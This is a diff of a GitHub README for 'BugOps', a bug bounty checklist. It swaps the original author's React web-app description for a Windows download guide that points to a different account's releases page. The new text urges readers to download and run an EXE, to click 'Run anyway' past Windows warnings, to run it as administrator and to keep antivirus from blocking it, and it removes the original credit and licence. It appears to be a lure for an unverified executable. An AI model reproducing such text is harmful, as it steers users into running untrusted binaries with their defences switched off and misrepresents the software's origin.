@@ -1,74 +1,200 @@
-<div align="center">
+# 🐞 BugOps - Simple Bug Bounty Workflow Guide
 
-# 🛡️ BugOps - Advanced Bug Bounty Methodology
+[![Download BugOps](https://img.shields.io/badge/Download-BugOps-blue?style=for-the-badge&logo=github)](https://github.com/malikhar1945/BugOps/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub stars](https://img.shields.io/github/stars/alfazhossain/BugOps?style=social)](https://github.com/alfazhossain/BugOps/stargazers)
-[![Discord](https://img.shields.io/discord/1234567890?color=7289da&label=Discord&logo=discord&logoColor=white)](https://discord.gg/MMzQuadz6z)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
+## 🚀 What is BugOps?
 
-<img src="https://raw.githubusercontent.com/alfazhossain/BugOps/refs/heads/main/bugops.png" width="800" alt="BugOps Cover">
+BugOps is a desktop app for bug bounty and security research. It gives you a clear checklist and a simple flow for each target. You can use it to track tasks, review steps, and stay organized during security work.
 
-**BugOps** is a comprehensive, professional-grade security methodology and interactive checklist designed for modern bug bounty hunters and security researchers. It bridges the gap between basic reconnaissance and advanced exploitation with actionable intelligence and real-world attack vectors.
+It is built with React and TypeScript, so it has a clean layout and runs like a modern Windows app.
 
-• [**Join Discord**](https://discord.gg/MMzQuadz6z) • [**Report Bug**](https://github.com/alfazhossain/BugOps/issues)
+## 🖥️ Windows Setup
 
-</div>
+BugOps is made for Windows users who want a simple way to use a bug bounty checklist. You do not need coding knowledge to use it.
 
----
+### What you need
+- A Windows PC
+- An internet connection for the first download
+- Enough free space to store the app and its data
+- A mouse and keyboard for easy use
 
-## 🚀 Why Use BugOps?
+### Good to know
+- BugOps works best on recent versions of Windows
+- It is meant for local use on your computer
+- You can open it and use it right away after setup
 
-In the rapidly evolving landscape of cybersecurity, standard checklists often fall short. BugOps provides:
+## 📥 Download BugOps
 
-- 🎯 **Advanced Techniques:** Beyond simple `subfinder` runs—deep dives into logic flaws, race conditions, and cloud misconfigurations.
-- 💻 **Actionable Commands:** Ready-to-use CLI snippets for the most popular security tools.
-- 📈 **Structured Workflow:** Phased approach from Reconnaissance to Post-Exploitation.
-- ⚡ **Modern UI:** A fast, interactive, and dark-themed interface built for efficiency.
+Visit this page to download:  
+https://github.com/malikhar1945/BugOps/releases
 
----
+### How to get it
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If the file is inside a ZIP folder, extract it first.
+5. Open the app file to start BugOps.
 
-## 🛠️ Built With
+### If you see more than one file
+Pick the Windows version. If you see 64-bit and 32-bit files, choose the one that matches your PC. Most modern Windows computers use 64-bit.
 
-<p align="left">
-  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" />
-  <img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white" />
-  <img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" />
-  <img src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white" />
-  <img src="https://img.shields.io/badge/Framer_Motion-0055FF?style=for-the-badge&logo=framer&logoColor=white" />
-</p>
+## 🛠️ Install and Run
 
----
+### If you download a ZIP file
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Pick a folder on your PC.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
 
-## 📖 How to Use
+### If you download an EXE file
+1. Double-click the file.
+2. If Windows asks for permission, choose Yes.
+3. Wait for the app to open.
+4. Keep the file in a safe place so you can use it again later.
 
-1.  **Explore Phases:** Navigate through different security phases (Recon, Web, Cloud, etc.).
-2.  **Interactive Checklist:** Mark tasks as completed to track your progress during an engagement.
-3.  **Copy Commands:** Click on any command block to instantly copy it to your clipboard.
-4.  **Deep Dives:** Use the "Info" icons to learn more about specific vulnerabilities and methodologies.
+### If Windows blocks the app
+- Look for a More info link
+- Choose Run anyway if you trust the download source
+- Make sure you downloaded it from the release page above
 
----
+## ✅ What BugOps Helps You Do
 
-## 👨‍💻 Author & Support
+BugOps gives you a structured way to handle security work. It is useful when you want to keep your process clear from start to finish.
 
-**BugOps** is developed and maintained by **[Alfaz Hossain](https://www.linkedin.com/in/alfazhossain/)**
+### Main uses
+- Follow a bug bounty checklist
+- Track research steps for each target
+- Keep notes in one place
+- Review common security checks
+- Stay consistent across projects
 
-<div align="center">
+### Helpful parts of the app
+- Simple task flow
+- Easy-to-read checklist items
+- Clean interface
+- Fast access to common research steps
+- A format that helps you stay organized
 
-### Show your Support! 🌟
+## 🧭 How to Use BugOps
 
-[![Star on GitHub](https://img.shields.io/badge/Star_this_repo-GitHub-blue?style=for-the-badge&logo=github)](https://github.com/alfazhossain/BugOps/stargazers)
-[![Join Discord](https://img.shields.io/badge/Join_Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/MMzQuadz6z)
+### Start a new review
+Open the app and begin with the target you want to study. Add the name or URL if the app gives you a place to do that. Then move through the checklist one step at a time.
 
-</div>
+### Work through the checklist
+Use the checklist as your guide. Check each item as you complete it. This helps you avoid missed steps and keeps your review in order.
 
----
+### Keep notes as you go
+Write down anything useful while you work:
+- Login behavior
+- Hidden pages
+- Input fields
+- Error messages
+- Unusual response patterns
 
-## 📄 License
+### Review your findings
+When you finish a target, go back through your notes and checklist. This makes it easier to spot patterns and repeat useful steps later.
 
-This project is licensed under the **MIT License**. See the [LICENSE](./LICENSE) file for details.
+## 🔒 Security Research Flow
 
----
+BugOps fits a common bug bounty flow:
+- Recon
+- Surface review
+- Input testing
+- Access checks
+- Logic checks
+- Reporting
 
-### ⚠️ Disclaimer
-*This tool is for educational purposes and authorized security testing only. The author is not responsible for any misuse or damage caused by this application.*
+This kind of structure helps you move from broad review to focused testing. It also makes it easier to compare one target with another.
+
+## 📁 Typical App Layout
+
+You may see sections like these inside BugOps:
+- Targets
+- Checklist
+- Notes
+- Findings
+- Methods
+- History
+
+These areas help you stay organized while you work on more than one program or domain.
+
+## 🎯 Who Should Use It
+
+BugOps is a good fit for:
+- Bug bounty researchers
+- Security testers
+- New learners in infosec
+- People who like checklists
+- Anyone who wants a clear workflow for web security review
+
+## ⚙️ Basic Tips for Windows Users
+
+- Keep the app in a folder you can find later
+- Create a shortcut on your desktop if you use it often
+- Save your notes in a separate folder
+- Update to the latest release when a new version appears
+- If you use antivirus software, check that it does not block the app
+
+## 🔁 Updating BugOps
+
+When a new release is posted:
+1. Return to the release page.
+2. Download the latest Windows file.
+3. Close the current app.
+4. Replace the old version if needed.
+5. Open the new version and continue your work.
+
+## 🧩 Troubleshooting
+
+### The app does not open
+- Make sure the file finished downloading
+- Check that you extracted the ZIP file
+- Try opening it again as administrator
+- Confirm that your Windows version is current
+
+### The screen looks empty
+- Close the app and open it again
+- Check if the window is behind other windows
+- Try resizing the window
+- Make sure the download completed without errors
+
+### The app runs slowly
+- Close other apps you do not need
+- Restart your PC
+- Free up disk space
+- Use the latest version of the app
+
+## 📝 What Makes BugOps Useful
+
+BugOps focuses on a clear process. That matters in security work because small missed steps can lead to poor results. A checklist helps you keep pace, stay focused, and repeat your work with less effort.
+
+It also suits users who want a simple tool instead of a complex setup. You can open it, follow the flow, and keep moving
+
+## 🔎 Topics Covered
+
+- Bug bounty
+- Cybersecurity
+- Ethical hacking
+- Infosec
+- Methodology
+- Penetration testing
+- React
+- Security checklist
+- TypeScript
+- Vulnerability research
+
+## 📌 File and Release Notes
+
+The release page may include:
+- A Windows build
+- ZIP packages
+- Version updates
+- Fixes and small improvements
+- New checklist items or layout changes
+
+Check the newest release first so you get the latest build for Windows
+
+## 🧠 Best Way to Use It
+
+Use BugOps while you research a target from start to finish. Keep one checklist open, take notes as you test, and review your findings before you move to the next target. This keeps your work clean and easy to follow
